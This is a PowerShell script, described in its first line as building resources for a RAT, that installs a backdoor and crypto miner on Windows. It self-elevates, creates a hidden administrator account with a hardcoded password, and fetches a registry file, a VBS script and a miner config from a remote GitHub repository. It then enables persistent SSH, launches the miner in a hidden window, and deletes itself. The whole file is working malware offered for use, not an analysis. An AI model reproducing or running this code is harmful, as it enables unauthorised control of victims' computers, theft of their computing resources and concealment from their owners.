# builds resources for RAT

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}


#create admin

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    $username = "Venom"
    $password = ConvertTo-SecureString "V3n0m" -AsPlainText -Force
    New-LocalUser $username -Password $password -FullName "Venom" -Description "Local admin account created via PowerShell"
    Add-LocalGroupMember -Group "Administrators" -Member $username
}


## variables
$wd = random_text
$path = "$env:temp/$wd"

$initial_dir = Get-Location


# create admin user
#$NewLocalAdmin = "Venom"
#$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
#Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# send ip to attacker
#./smtp.ps1

#goto temp, make working dir
mkdir $path
cd $path
# mv $initial_dir/smtp.txt ./smtp.ps1
#./smtp.ps1

# registry to hide  local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"

#visual basic scrit to download the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty.vbs -OutFile "calty.vbs"

#Download modified config.json
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"

# enabling  persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

#install the registry
./wrev.reg; ./calty

#Create rig Folder within Folder
New-Item -Name "$wd" -Path "$path" -ItemType Directory
cd $wd

# Get the current directory
$currentDirectory = $PWD

# Download the ZIP file
# Invoke-WebRequest -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/xmrig-6.22.2-gcc-win64.zip" -OutFile "xmrig-6.22.2-gcc-win64.zip"



# Extract the ZIP file in the current directory
#Expand-Archive -Path "$currentDirectory\xmrig-6.22.2.zip" -DestinationPath $currentDirectory

# Verify extraction
#Get-ChildItem -Path $currentDirectory

#replace config.json
$newConfigPath = "$path\config.json"
$targetConfigPath = "$currentDirectory\config.json"

if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "Config.json file has been replaced successfully."
} else {
    Write-Output "New config.json file not found at the specified path."
}




# start rig
powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd


# hide venom user

# self delete
cd $initial_dir
del installer.ps1

